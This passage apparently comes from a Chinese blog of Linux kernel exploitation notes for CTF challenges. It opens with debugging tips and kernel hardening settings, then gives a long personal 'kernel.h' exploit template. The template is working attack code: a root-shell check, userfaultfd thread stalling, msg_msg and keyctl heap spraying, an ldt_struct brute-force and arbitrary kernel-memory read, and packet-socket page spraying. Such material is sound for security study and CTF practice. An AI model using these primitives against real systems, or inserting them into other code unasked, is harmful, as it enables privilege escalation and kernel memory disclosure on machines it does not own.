    leak_info("cur_task", cur_task);
}
```

## 0x1B. gdb调试qemu启动的内核时，在用户态查看内核态的数据

笔者调试内核时，警察会遇到如下场景：

笔者希望查看`exp`某一行前后的变化，例如笔者`exp`某一行是`setxattr`修改某个`obj`的内容，若直接下断点到内核中的函数，则难以定位。若直接在用户态查看内核数据，可能会出现如下情况：

```c
pwndbg> tele 0xffffffffc0002480
<Could not read memory at 0xffffffffc0002480>
```

经过笔者实测，**这个原因和`kpti`的开启有关，而和`smep/smap`的开启无关**。这可能是因为用户页表中此时没有内核态的代码映射导致的。因此，解决的方法就是到`qemu`的启动脚本中手动关闭`kpti`即可，并不影响解题。

```c
pwndbg> tele 0xffffffffc0002480
00:0000│  0xffffffffc0002480 —▸ 0xffff88800e278140 ◂— 0
01:0008│  0xffffffffc0002488 —▸ 0xffff88800e278b80 ◂— 1
02:0010│  0xffffffffc0002490 ◂— 0
03:0018│  0xffffffffc0002498 —▸ 0xffff88800e278cc0 ◂— 2
04:0020│  0xffffffffc00024a0 ◂— 0
05:0028│  0xffffffffc00024a8 ◂— 0
06:0030│  0xffffffffc00024b0 ◂— 0
07:0038│  0xffffffffc00024b8 —▸ 0xffff88800e2783c0 ◂— 3
```

## 0x1C. pthread_create有很多噪声

记一下吧，调的时候给我调坏了，结果最后发现是这个原因

它`0x40`、`0x1000`等很多大小的`obj`的噪声都有。多注意一下。

## 0x1D. 内核态中任意地址释放的一些心得

弄`msg_msg`的时候，总是想着，既然我有任意地址释放，那为什么不可以直接释放掉`modprobe_path`，或者是`cred`结构体这些内容，然后直接`setxattr`改一下呢。

后面想出来了，因为内核里能认识它是属于多大的`obj`，而像`modprobe_path`这种甚至不是`obj`，自然也无法释放掉之后再申请回来。

像`cred`结构体，它前`8`个字节不为`0`（`msg_seg`的要求），那我只能将指针指向`cred`结构体的前`8`个字节了，然而那指向的也不是`cred`结构体了，所以其实不太能利用

## 0xFF. 内核保护配置记录

```bash
CONFIG_SLAB=y 使用SLAB而不是SLUB
CONFIG_SLUB=y 使用SLUB而不是SLAB，如今常用版本

CONFIG_SLAB_FREELIST_RANDOM=y 开启Random Freelist
CONFIG_SLAB_FREELIST_HARDENED=y 开启Hardened Freelist
CONFIG_HARDENED_USERCOPY=y 开启Hardened Usercopy

CONFIG_STATIC_USERMODEHELPER=y 开启Static Usermodehelper Path（modprobe_path 为只读，不可修改）
CONFIG_STATIC_USERMODEHELPER_PATH=""

CONFIG_MEMCG=y 决定是否开启MEMCG功能，以下如CONFIG_MEMCG_KMEM需要先开启该保护，默认开启
CONFIG_MEMCG_KMEM=y 不同flags标志的obj将会隔离
CONFIG_MEMCG_SWAP=y 控制内核是否支持Swap Extension， 限制cgroup中所有进程所能使用的交换空间总量 

CONFIG_DEBUG_LIST=y 开启时内核会在链表操作中进行额外的检查，例如开启时msg_msg中的__list_del_entry函数会变成更严格的校验

CONFIG_SHUFFLE_PAGE_ALLOCATOR=y 开启page allocator freelist随机化，具体作用待补充
```

`rcS`中：

```bash
echo 1 > /proc/sys/kernel/dmesg_restrict  # 普通用户无法访问dmesg
echo 0 > /proc/sys/kernel/dmesg_restrict  # 普通用户可以访问dmesg

echo 0 > /proc/sys/kernel/kptr_restrict # 普通用户可以访问/proc/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict # 只有root可以访问/proc/kallsyms
echo 2 > /proc/sys/kernel/kptr_restrict # 任何用户都不可以访问/proc/kallsyms
```



# 笔者自用kernel.h模板（到处抄的）

```c
#ifndef LTFALLKERNEL_H
#define LTFALLKERNEL_H

#define _GNU_SOURCE

#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <poll.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/xattr.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/socket.h>
// #include <asm/ldt.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <semaphore.h>
#include <arpa/inet.h>

/**
 * 0x00. 基本函数
 */

size_t user_cs, user_ss, user_rflags, user_sp;
size_t kernel_base = 0xffffffff81000000, kernel_offset = -1;

/**
 * @ show basic information
 */

void leak_info(char *content, size_t value)
{
    success("%s => 0x%llx.", content, value);
}

void info(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[34m\033[1m[*] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void success(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[32m\033[1m[+] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void error(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[31m\033[1m[x] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void save_status()
{
    asm volatile(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    info("Status has been saved.");
}

void get_root_shell(void)
{
    if (getuid())
    {
        error("Failed to get the root!");
        exit(-1);
    }

    success("Successful to get the root. Execve root shell now...");
    system("/bin/sh");

    exit(0);
}

void err_exit(char *buf)
{
    error(buf);
    exit(0);
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    info("Process binded to core %d.", core);
}

/**
 * 0x01. userfaultfd相关
 * 本部分全部抄自于arttnba3师傅
 */

/**
 * The MUSL also doesn't contain `userfaultfd.h` :(
 * Luckily we just need a bit of micros in exploitation,
 * so just define them directly is okay :)
 */

#define UFFD_API ((uint64_t)0xAA)
#define _UFFDIO_REGISTER (0x00)
#define _UFFDIO_COPY (0x03)
#define _UFFDIO_API (0x3F)

/* userfaultfd ioctl ids */
#define UFFDIO 0xAA
#define UFFDIO_API _IOWR(UFFDIO, _UFFDIO_API, \
                         struct uffdio_api)
#define UFFDIO_REGISTER _IOWR(UFFDIO, _UFFDIO_REGISTER, \
                              struct uffdio_register)
#define UFFDIO_COPY _IOWR(UFFDIO, _UFFDIO_COPY, \
                          struct uffdio_copy)

/* read() structure */
struct uffd_msg
{
    uint8_t event;

    uint8_t reserved1;
    uint16_t reserved2;
    uint32_t reserved3;

    union
    {
        struct
        {
            uint64_t flags;
            uint64_t address;
            union
            {
                uint32_t ptid;
            } feat;
        } pagefault;

        struct
        {
            uint32_t ufd;
        } fork;

        struct
        {
            uint64_t from;
            uint64_t to;
            uint64_t len;
        } remap;

        struct
        {
            uint64_t start;
            uint64_t end;
        } remove;

        struct
        {
            /* unused reserved fields */
            uint64_t reserved1;
            uint64_t reserved2;
            uint64_t reserved3;
        } reserved;
    } arg;
} __attribute__((packed));

#define UFFD_EVENT_PAGEFAULT 0x12

struct uffdio_api
{
    uint64_t api;
    uint64_t features;
    uint64_t ioctls;
};

struct uffdio_range
{
    uint64_t start;
    uint64_t len;
};

struct uffdio_register
{
    struct uffdio_range range;
#define UFFDIO_REGISTER_MODE_MISSING ((uint64_t)1 << 0)
#define UFFDIO_REGISTER_MODE_WP ((uint64_t)1 << 1)
    uint64_t mode;
    uint64_t ioctls;
};

struct uffdio_copy
{
    uint64_t dst;
    uint64_t src;
    uint64_t len;
#define UFFDIO_COPY_MODE_DONTWAKE ((uint64_t)1 << 0)
    uint64_t mode;
    int64_t copy;
};

// #include <linux/userfaultfd.h>

char temp_page_for_stuck[0x1000];

void register_userfaultfd(pthread_t *monitor_thread, void *addr,
                          unsigned long len, void *(*handler)(void *))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
    {
        err_exit("userfaultfd");
    }

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    {
        err_exit("ioctl-UFFDIO_API");
    }

    uffdio_register.range.start = (unsigned long)addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    {
        err_exit("ioctl-UFFDIO_REGISTER");
    }

    s = pthread_create(monitor_thread, NULL, handler, (void *)uffd);
    if (s != 0)
    {
        err_exit("pthread_create");
    }
}

void *uffd_handler_for_stucking_thread(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long)args;

    for (;;)
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
        {
            err_exit("poll");
        }

        nread = read(uffd, &msg, sizeof(msg));

        /* just stuck there is okay... */
        sleep(100000000);

        if (nread == 0)
        {
            err_exit("EOF on userfaultfd!\n");
        }

        if (nread == -1)
        {
            err_exit("read");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT)
        {
            err_exit("Unexpected event on userfaultfd\n");
        }

        uffdio_copy.src = (unsigned long long)temp_page_for_stuck;
        uffdio_copy.dst = (unsigned long long)msg.arg.pagefault.address &
                          ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        {
            err_exit("ioctl-UFFDIO_COPY");
        }

        return NULL;
    }
}

void register_userfaultfd_for_thread_stucking(pthread_t *monitor_thread,
                                              void *buf, unsigned long len)
{
    register_userfaultfd(monitor_thread, buf, len,
                         uffd_handler_for_stucking_thread);
}

/**
 * 0x02. keyctl相关
 * 本部分仍然就是摘录于arttnba3师傅的博客
 */

#define KEY_SPEC_PROCESS_KEYRING -2 /* - key ID for process-specific keyring */
#define KEYCTL_UPDATE 2             /* update a key */
#define KEYCTL_REVOKE 3             /* revoke a key */
#define KEYCTL_UNLINK 9             /* unlink a key from a keyring */
#define KEYCTL_READ 11              /* read a key or keyring's contents */

int key_alloc(char *description, void *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen,
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, void *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, void *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

/**
 * 0x03. msg_msg相关
 * 本部分仍然就是摘录于arttnba3师傅的博客
 */

#ifndef MSG_COPY
#define MSG_COPY 040000
#endif

struct list_head
{
    uint64_t next;
    uint64_t prev;
};

struct msg_msg
{
    struct list_head m_list;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
};

struct msg_msgseg
{
    uint64_t next;
};

// struct msgbuf {
//     long mtype;
//     char mtext[1];
// };

int get_msg_queue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf *)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp,
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
               uint64_t m_type, uint64_t m_ts, uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

/**
 * 0x04. ldt_struct相关
 * 本部分仍然就是摘录于arttnba3师傅的博客
 */

/**
 * Somethings we may want to compile the exp binary with MUSL-GCC, which
 * doesn't contain the `asm/ldt.h` file.
 * As the file is small, I copy that directly to here :)
 */

/* Maximum number of LDT entries supported. */
#define LDT_ENTRIES 8192
/* The size of each LDT entry. */
#define LDT_ENTRY_SIZE 8

#ifndef __ASSEMBLY__
/*
 * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS
 * not to the default values if you still want to do syscalls. This
 * call is more for 32bit mode therefore.
 */
struct user_desc
{
    unsigned int entry_number;
    unsigned int base_addr;
    unsigned int limit;
    unsigned int seg_32bit : 1;
    unsigned int contents : 2;
    unsigned int read_exec_only : 1;
    unsigned int limit_in_pages : 1;
    unsigned int seg_not_present : 1;
    unsigned int useable : 1;
#ifdef __x86_64__
    /*
     * Because this bit is not present in 32-bit user code, user
     * programs can pass uninitialized values here.  Therefore, in
     * any context in which a user_desc comes from a 32-bit program,
     * the kernel must act as though lm == 0, regardless of the
     * actual value.
     */
    unsigned int lm : 1;
#endif
};

#define MODIFY_LDT_CONTENTS_DATA 0
#define MODIFY_LDT_CONTENTS_STACK 1
#define MODIFY_LDT_CONTENTS_CODE 2

#endif /* !__ASSEMBLY__ */

/* this should be referred to your kernel */
#define SECONDARY_STARTUP_64 0xffffffff81000060

/* desc initializer */
static inline void init_desc(struct user_desc *desc)
{
    /* init descriptor info */
    desc->base_addr = 0xff0000;
    desc->entry_number = 0x8000 / 8;
    desc->limit = 0;
    desc->seg_32bit = 0;
    desc->contents = 0;
    desc->limit_in_pages = 0;
    desc->lm = 0;
    desc->read_exec_only = 0;
    desc->seg_not_present = 0;
    desc->useable = 0;
}

/**
 * @brief burte-force hitting page_offset_base by modifying ldt_struct
 *
 * @param ldt_cracker function to make the ldt_struct modifiable
 * @param cracker_args args of ldt_cracker
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param burte_size size of each burte-force hitting
 * @return size_t address of page_offset_base
 */
size_t ldt_guessing_direct_mapping_area(void *(*ldt_cracker)(void *),
                                        void *cracker_args,
                                        void *(*ldt_momdifier)(void *, size_t),
                                        void *momdifier_args,
                                        uint64_t burte_size)
{
    struct user_desc desc;
    uint64_t page_offset_base = 0xffff888000000000;
    uint64_t temp;
    char *buf;
    int retval;

    /* init descriptor info */
    init_desc(&desc);

    /* make the ldt_struct modifiable */
    ldt_cracker(cracker_args);
    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));

    /* leak kernel direct mapping area by modify_ldt() */
    while (1)
    {
        ldt_momdifier(momdifier_args, page_offset_base);
        retval = syscall(SYS_modify_ldt, 0, &temp, 8);
        if (retval > 0)
        {
            break;
        }
        else if (retval == 0)
        {
            printf("[x] no mm->context.ldt!");
            page_offset_base = -1;
            break;
        }
        page_offset_base += burte_size;
    }

    return page_offset_base;
}

/**
 * @brief read the contents from a specific kernel memory.
 * Note that we should call ldtGuessingDirectMappingArea() firstly,
 * and the function should be used in that caller process
 *
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param addr address of kernel memory to read
 * @param res_buf buf to be written the data from kernel memory
 */
void ldt_arbitrary_read(void *(*ldt_momdifier)(void *, size_t),
                        void *momdifier_args, size_t addr, char *res_buf)
{
    static char buf[0x8000];
    struct user_desc desc;
    uint64_t temp;
    int pipe_fd[2];

    /* init descriptor info */
    init_desc(&desc);

    /* modify the ldt_struct->entries to addr */
    ldt_momdifier(momdifier_args, addr);

    /* read data by the child process */
    pipe(pipe_fd);
    if (!fork())
    {
        /* child */
        syscall(SYS_modify_ldt, 0, buf, 0x8000);
        write(pipe_fd[1], buf, 0x8000);
        exit(0);
    }
    else
    {
        /* parent */
        wait(NULL);
        read(pipe_fd[0], res_buf, 0x8000);
    }

    close(pipe_fd[0]);
    close(pipe_fd[1]);
}

/**
 * @brief seek specific content in the memory.
 * Note that we should call ldtGuessingDirectMappingArea() firstly,
 * and the function should be used in that caller process
 *
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param page_offset_base the page_offset_base we leakked before
 * @param mem_finder your own function to search on a 0x8000-bytes buf.
 *          It should be like `size_t func(void *args, char *buf)` and the `buf`
 *          is where we store the data from kernel in ldt_seeking_memory().
 *          The return val should be the offset of the `buf`, `-1` for failure
 * @param finder_args your own function's args
 * @return size_t kernel addr of content to find, -1 for failure
 */
size_t ldt_seeking_memory(void *(*ldt_momdifier)(void *, size_t),
                          void *momdifier_args, uint64_t page_offset_base,
                          size_t (*mem_finder)(void *, char *), void *finder_args)
{
    static char buf[0x8000];
    size_t search_addr, result_addr = -1, offset;

    search_addr = page_offset_base;

    while (1)
    {
        ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);

        offset = mem_finder(finder_args, buf);
        if (offset != -1)
        {
            result_addr = search_addr + offset;
            break;
        }

        search_addr += 0x8000;
    }

    return result_addr;
}

/**
 * 0x05. pgv与页级内存分配相关
 * 本部分仍然就是摘录于arttnba3师傅的博客
 */

#define PGV_PAGE_NUM 1000
#define PACKET_RX_RING 5
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req
{
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

struct tpacket_req3 {
	unsigned int	tp_block_size;	/* Minimal size of contiguous block */
	unsigned int	tp_block_nr;	/* Number of blocks */
	unsigned int	tp_frame_size;	/* Size of frame */
	unsigned int	tp_frame_nr;	/* Total number of frames */
	unsigned int	tp_retire_blk_tov; /* timeout in msecs */
	unsigned int	tp_sizeof_priv; /* offset to private data area */
	unsigned int	tp_feature_req_word;
};

struct sockaddr_ll {
	unsigned short	sll_family;
	uint16_t		sll_protocol;
	int		sll_ifindex;
	unsigned short	sll_hatype;
	unsigned char	sll_pkttype;
	unsigned char	sll_halen;
	unsigned char	sll_addr[8];
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct page_request {
    int idx;
    int cmd;
};


/* operations type */
enum
{
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* tpacket version for setsockopt */
enum tpacket_versions
{
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}


/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx)
{
    struct page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}


/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(0x1000, 1);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

/* init pgv-exploit subsystem :) */
void prepare_pgv_system(void)
{
    /* pipe for pgv */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);

    /* child process for pages spray */
    if (!fork())
    {
        spray_cmd_handler();
    }
}

/**
 * 0x06. pgv与USMA相关
 */

#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif


void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        puts("[X] setsockopt(PACKET_VERSION)");
        exit(-1);
    }
 
    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;
 
    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) {
        puts("setsockopt(PACKET_RX_RING)");
        exit(-1);
    }
}
 
int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        puts("socket(AF_PACKET)");
        exit(-1);
    }
 
    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);
 
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;
 
    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) {
        puts("bind(AF_PACKET)");
        exit(-1);
    }
 
    return s;
}
 
int alloc_pgv(int count, int size) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}



#endif // LTFALLKERNEL_H

```

